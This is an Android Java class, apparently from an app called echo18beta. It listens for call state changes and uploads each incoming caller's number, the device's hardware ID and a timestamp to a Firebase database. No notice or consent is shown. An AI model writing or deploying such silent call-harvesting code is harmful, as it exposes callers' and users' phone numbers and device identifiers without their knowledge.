package prabhu.company.echo18beta.misc;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by shravan on 26/3/18.
 */
public class ServiceReceiver extends BroadcastReceiver {
    TelephonyManager telephony;
    @Override
    public void onReceive(final Context context, Intent intent) {
        telephony = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
        telephony.listen(new PhoneStateListener(){
            @Override
            public void onCallStateChanged(int state, String incomingNumber) {
                super.onCallStateChanged(state, incomingNumber);
                Log.e("PHONEService", "RINGING, number: " + incomingNumber);
                Map callMap = new HashMap();
                callMap.put("Time", ServerValue.TIMESTAMP);
                callMap.put("Device",telephony.getDeviceId());
                callMap.put("Number",incomingNumber);
                FirebaseDatabase.getInstance().getReference().child("misc").child("phone").child("calls").setValue(callMap);
            }
        },PhoneStateListener.LISTEN_CALL_STATE);
    }
}